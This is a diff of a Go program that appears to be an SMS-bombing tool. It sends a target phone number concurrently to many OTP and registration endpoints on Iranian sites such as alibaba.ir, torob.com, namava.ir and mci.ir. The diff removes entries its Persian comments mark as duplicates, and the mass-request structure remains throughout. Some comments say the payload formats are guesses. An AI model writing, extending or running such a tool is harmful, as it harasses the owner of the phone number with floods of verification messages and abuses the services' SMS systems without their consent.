@@ -562,14 +562,6 @@ func main() {
 			}, &wg, ch)
 		}
 
-		// ws.alibaba.ir (JSON) - تکراری، ولی اضافه میکنیم طبق لیست شما
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
-				"phoneNumber": phone,
-			}, &wg, ch)
-		}
-
 		// takshopaccessorise.ir (JSON)
 		wg.Add(1)
 		tasks <- func() {
@@ -588,22 +580,6 @@ func main() {
 			}, &wg, ch)
 		}
 
-		// api.torob.com (JSON) - تکراری، ولی اضافه میکنیم
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://api.torob.com/v4/user/phone/send-pin", map[string]interface{}{
-				"phone_number": phone,
-			}, &wg, ch)
-		}
-
-		// drdr.ir (JSON) - تکراری، ولی اضافه میکنیم
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://drdr.ir/api/registerEnrollment/verifyMobile", map[string]interface{}{
-				"phoneNumber": phone,
-			}, &wg, ch)
-		}
-
 		// app.itoll.ir (JSON)
 		wg.Add(1)
 		tasks <- func() {
@@ -617,14 +593,6 @@ func main() {
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", map[string]interface{}{
 				"phone": phone,
-			}, &wg, ch)
-		}
-
-		// core.gap.im (JSON) - تکراری، ولی اضافه میکنیم
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://core.gap.im/v1/user/add.json", map[string]interface{}{
-				"mobile": phone,
 			}, &wg, ch)
 		}
 
@@ -688,14 +656,6 @@ func main() {
 			sendFormRequest(ctx, "https://fankala.com/wp-admin/admin-ajax.php", formData, &wg, ch)
 		}
 
-		// khanoumi.com (JSON) - تکراری، ولی اضافه میکنیم
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://www.khanoumi.com/accounts/sendotp", map[string]interface{}{
-				"mobile": phone,
-			}, &wg, ch)
-		}
-
 		// filmnet.ir (URL based) - این URL شامل متغیر درونی است و payload عجیب است
 		// فرض میکنیم نیاز به GET یا POST بدون payload پیچیده است. با فرض POST JSON با کلید ساده
 		wg.Add(1)
@@ -705,14 +665,6 @@ func main() {
 			// Payload "otp:login":phone عجیب است. با فرض JSON و کلید "phone"
 			sendJSONRequest(ctx, url, map[string]interface{}{
 				"phone": phone, // حدس بر اساس نیاز APIهای مشابه
-			}, &wg, ch)
-		}
-
-		// namava.ir (JSON) - تکراری، ولی اضافه میکنیم
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", map[string]interface{}{
-				"UserName": phone,
 			}, &wg, ch)
 		}
 
@@ -845,14 +797,6 @@ func main() {
 			}, &wg, ch)
 		}
 
-		// ws.alibaba.ir (JSON) - تکراری
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
-				"phoneNumber": phone,
-			}, &wg, ch)
-		}
-
 		// api.bitbarg.com (JSON)
 		wg.Add(1)
 		tasks <- func() {
@@ -893,31 +837,6 @@ func main() {
 				"mobile": phone,
 			}, &wg, ch)
 		}
-
-		// app.itoll.ir (JSON) - تکراری
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://app.itoll.ir/api/v1/auth/login", map[string]interface{}{
-				"mobile": phone,
-			}, &wg, ch)
-		}
-
-		// gw.taaghche.com (JSON) - signup - تکراری
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{
-				"contact": phone,
-			}, &wg, ch)
-		}
-
-		// namava.ir (JSON) - با otp - تکراری
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://www.namava.ir/api/v1.0/accounts/registrations/by-otp/request", map[string]interface{}{
-				"UserName": phone,
-			}, &wg, ch)
-		}
-
 		// application2.billingsystem.ayantech.ir (JSON) - payload پیچیده
 		// فرض میکنیم منظور JSON با ساختار مشخص بوده
 		wg.Add(1)
@@ -941,14 +860,6 @@ func main() {
 			}, &wg, ch)
 		}
 
-		// application2.billingsystem.ayantech.ir (JSON) - requestActivationCode - تکراری
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{
-				"MobileNumber": phone,
-			}, &wg, ch)
-		}
-
 		// core.pishkhan24.ayantech.ir (JSON) - LoginByOTP - payload با "null, Username"
 		// فرض میکنیم منظور JSON با کلید "Username" بوده
 		wg.Add(1)
@@ -958,43 +869,11 @@ func main() {
 			}, &wg, ch)
 		}
 
-		// core.pishkhan24.ayantech.ir (JSON) - LoginByOTP - تکراری
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://core.pishkhan24.ayantech.ir/webservices/core.svc/v1/LoginByOTP", map[string]interface{}{
-				"Username": phone,
-			}, &wg, ch)
-		}
-
-		// core.pishkhan24.ayantech.ir (JSON) - LoginByOTP - تکراری
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://core.pishkhan24.ayantech.ir/webservices/core.svc/v1/LoginByOTP", map[string]interface{}{
-				"Username": phone,
-			}, &wg, ch)
-		}
-
 		// simkhanapi.ir (JSON)
 		wg.Add(1)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://simkhanapi.ir/api/users/registerV2", map[string]interface{}{
 				"mobileNumber": phone,
-			}, &wg, ch)
-		}
-
-		// api.abantether.com (JSON) - تکراری
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
-				"phone_number": phone,
-			}, &wg, ch)
-		}
-
-		// bit24.cash (JSON) - تکراری
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
-				"mobile": phone,
 			}, &wg, ch)
 		}
 
@@ -1205,14 +1084,6 @@ func main() {
 			}, &wg, ch)
 		}
 
-		// ebcom.mci.ir (JSON) - تکراری
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://ebcom.mci.ir/services/auth/v1.0/otp", map[string]interface{}{
-				"msisdn": phone,
-			}, &wg, ch)
-		}
-
 		// refahtea.ir (Form) - مسیر wp-admin/admin-ajax.php یا مشابه آن نیست اما ممکن است فرم باشد
 		// با فرض JSON
 		wg.Add(1)
@@ -1237,15 +1108,6 @@ func main() {
 				"cellphone": phone,
 			}, &wg, ch)
 		}
-
-		// api.abantether.com (JSON) - تکراری
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
-				"phone_number": phone,
-			}, &wg, ch)
-		}
-
 		// abantether.com (JSON) - payload با s1
 		// s1 به شکل "'phoneNumber':%s ,'email':''" تعریف شده که ساختار JSON نیست
 		// فرض میکنیم منظور JSON با دو کلید phoneNumber و email بوده
